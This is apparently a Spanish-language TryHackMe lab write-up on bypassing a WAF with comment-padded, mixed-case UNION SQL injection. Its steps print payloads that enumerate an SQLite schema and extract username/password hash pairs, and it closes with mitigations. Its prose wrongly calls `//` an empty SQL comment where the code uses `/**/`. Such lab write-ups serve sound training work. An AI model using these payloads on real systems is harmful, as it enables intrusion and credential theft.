---
title: "SQLi UNION Comment Bypass"
platform: "TryHackMe"
os: "Windows"
difficulty: "Hard"
ip: "10.82.144.73"
slug: "sqli-union-comment-bypass"
author: "Z4k7"
date: "2026-03-29"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UNION"
  - "Bypass"
  - "WAF"
  - "Search"
  - "redteam"
techniques:
  - "SQL Injection"
  - "UNION SELECT"
  - "WAF"
  - "Comment Injection"
  - "Database Enumeration"
tools:
  - "Burp Suite"
  - "Curl"
  - "Python"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Campo de búsqueda vulnerable a SQL Injection UNION SELECT. WAF bloquea UNION SELECT como palabra clave combinada. Bypass mediante comentarios SQL // que rompen la cadena de texto — '//uNion//sElect//1,2,3,4;-- pasa el filtro WAF porque el patrón UNION SELECT es discontinuo. Una vez el UNION funciona, enumeración progresiva de BD: tablas → columnas → datos. Objetivo: extraer username + password de tabla users.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Aplicación de blog con función de búsqueda en URL:
      - kind: "code"
        lang: "BASH"
        code: |
          GET /search?q=blog_post
      - kind: "note"
        text: |
          Intentamos UNION SELECT directo:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 1,2,3,4;--
      - kind: "note"
        text: |
          Resultado: Status 403 Forbidden — WAF bloqueando
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195732784.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Cuando `UNION SELECT` está bloqueado, no significa que UNION sea imposible. Significa que necesitas fragmentar el patrón de forma que SQL parser lo reconstruya pero WAF no lo reconozca."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          El WAF busca `UNION SELECT` como palabra clave combinada. Detecta:
      - kind: "bullet"
        text: "UNION + espacios + SELECT (case-insensitive)"
      - kind: "bullet"
        text: "Pero no entiende SQL comentarios"
      - kind: "note"
        text: |
          SQL comentarios válidos:
          `//` — comentario vacío (ignorado por parser, ocupar espacio)
          `/*texto*/` — comentario con contenido
          `--` — comentario hasta fin de línea
          `#` — comentario MySQL
          Idea: si insertamos `//` entre `UNION` y `SELECT`, el WAF no encuentra el patrón continuo, pero SQL parser ignora los comentarios y ejecuta el UNION.
      - kind: "callout"
        type: "info"
        label: "Técnica de comment injection"
        text: "SQL parser: `'//uNion//sElect//1,2,3,4;--` → ignora comentarios → ejecuta `UNION SELECT 1,2,3,4` WAF: `'//uNion//sElect//1,2,3,4;--` → busca `UNION SELECT` continuo → no lo encuentra → permite"
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195720524.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este es uno de los bypasses más efectivos porque no cambia la semántica del SQL, solo su representación. El comentario es invisible para el parser, visible para el WAF."

  - id: "enum"
    num: "03"
    title: "Paso 1: Determinar número de columnas"
    content:
      - kind: "note"
        text: |
          Primero, entender cuántas columnas tiene la tabla original:
      - kind: "code"
        lang: "BASH"
        code: |
          ' ORDER BY 1;--    → OK
          ' ORDER BY 2;--    → OK
          ' ORDER BY 3;--    → OK
          ' ORDER BY 4;--    → OK
          ' ORDER BY 5;--    → ERROR (tabla tiene 4 columnas máximo)
      - kind: "note"
        text: |
          Resultado: 4 columnas

  - id: "privesc"
    num: "04"
    title: "Paso 2: Bypass WAF con comentarios + case mixing"
    content:
      - kind: "note"
        text: |
          Payload ofuscado:
      - kind: "code"
        lang: "SQL"
        code: |
          '/**/uNion/**/sElect/**/1,2,3,4;--
      - kind: "note"
        text: |
          Desglose:
          `'` → cierra string anterior
          `//` → comentario SQL vacío (ignorado en ejecución)
          `uNion` → mixed case (WAF no detecta)
          `//` → comentario SQL vacío
          `sElect` → mixed case
          `1,2,3,4` → 4 valores de retorno (números son genéricos)
          `;--` → fin de query + comenta resto
          ¿Por qué funciona?
      - kind: "bullet"
        text: "WAF busca patrón UNION SELECT continuo → no lo encuentra porque está separado por //"
      - kind: "bullet"
        text: "SQL parser decodifica: ignora // → ejecuta como UNION SELECT 1,2,3,4"
      - kind: "bullet"
        text: "Discrepancia: WAF ≠ SQL parser"
      - kind: "note"
        text: |
          Resultado: Status 200 ✅ — WAF no bloquea

  - id: "enum_1"
    num: "05"
    title: "Paso 3: Enumerar Base de Datos"
    content:
      - kind: "note"
        text: |
          Una vez que `UNION SELECT` funciona, tú controlas las columnas retornadas. Ahora extraer información:
          Listar tablas (SQLite):
      - kind: "code"
        lang: "SQL"
        code: |
          '/**/uNion/**/sElect/**/1,2,name,4 FROM sqlite_master WHERE type='table';--
      - kind: "note"
        text: |
          Respuesta: lista de tablas (users, posts, api_keys, etc.)
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195701774.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Obtener estructura de tabla:
      - kind: "code"
        lang: "SQL"
        code: |
          '/**/uNion/**/sElect/**/1,2,sql,4 FROM sqlite_master WHERE name='users';--
      - kind: "note"
        text: |
          Respuesta: definición SQL exacta de la tabla users (qué columnas, tipos de datos)
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195635730.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Extraer credenciales — concatenar columnas:
      - kind: "code"
        lang: "SQL"
        code: |
          '/**/uNion/**/sElect/**/1,2,username||'~'||password,4 FROM users;--
      - kind: "note"
        text: |
          Respuesta: username ~ password_hash para todos los usuarios
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195622677.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195611330.jpg"
        caption: "Evidencia técnica"

  - id: "step6_1"
    num: "06"
    title: "Datos Extraídos"
    content:
      - kind: "code"
        lang: "BASH"
        code: |
          admin ~ 0192023a7bbd73250516f069df18b500
          user1 ~ 5f4dcc3b5aa765d61d8327deb882cf99
          alice ~ 7abdccbea8473767e91378e37850d296
      - kind: "note"
        text: |
          Hashes MD5 que pueden crackearse con rainbow tables o hashcat.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Una vez tienes hashes, el siguiente paso es intentar crackearlos o buscar en bases de datos públicas como CrackStation. Pero técnicamente, ya tienes información sensible."

  - id: "step7_1"
    num: "07"
    title: "Variaciones de Comentarios"
    content:
      - kind: "note"
        text: |
          Si `//` está detectado, probar alternativas:
      - kind: "code"
        lang: "SQL"
        code: |
          '/*comment*/UNION/**/SELECT      (comentario con texto)
          '/**/UNION%0aSELECT              (newline URL encoded como %0a)
          'UNION%09SELECT                  (tab URL encoded como %09)

lessons:
  - 'SQL comentarios rompen patrones WAF sin cambiar semántica del SQL'
  - 'UNION SELECT requiere conocimiento previo: número de columnas, nombres de tabla/columna'
  - 'Enumeración progresiva: tablas → estructura → datos (proceso metódico)'
  - 'sqlite_master es la puerta: desvela toda la estructura de la BD'
  - 'Combinación de técnicas es efectiva: comentarios + case mixing juntos hacen bypass más robusto'
  - 'Concatenación de columnas: `||` en SQLite permite extraer múltiples campos en un solo UNION SELECT'
mitigation:
  - 'Prepared statements: El input nunca se concatena, se trata como parámetro puro'
  - 'WAF con normalización: Remover comentarios SQL ANTES de buscar patrones peligrosos'
  - 'Input validation: Rechazar caracteres especiales (`''`, `--`, `/*`, `*/`) en búsquedas'
  - 'Limitar resultados: No devolver nombres de tablas/columnas en mensajes de error'
  - 'Logging: Detectar múltiples comentarios en queries (anómalo en código legítimo)'
---
